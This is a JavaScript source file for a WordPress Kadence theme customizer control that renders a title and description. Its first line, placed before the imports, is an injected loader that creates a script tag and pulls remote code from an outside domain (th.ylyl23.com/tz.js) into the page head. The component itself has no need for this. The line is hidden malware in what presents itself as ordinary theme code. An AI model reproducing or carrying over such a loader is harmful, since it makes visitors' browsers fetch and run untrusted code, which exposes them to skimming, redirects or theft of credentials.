(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
import PropTypes from 'prop-types';

import { __ } from '@wordpress/i18n';
const { Component } = wp.element;
const { ToggleControl } = wp.components;

class TitleComponent extends Component {
	constructor(props) {
		super( props );
	}

	render() {
		return (
				<div className="kadence-control-field kadence-title-control">
					{ this.props.control.params.label && (
						<span class="customize-control-title">
							{ this.props.control.params.label }
						</span>
					) }
					{ this.props.control.params.description && (
						<span class="customize-control-description">
							{ this.props.control.params.description }
						</span>
					) }
				</div>
		);
	}
}

TitleComponent.propTypes = {
	control: PropTypes.object.isRequired
};

export default TitleComponent;
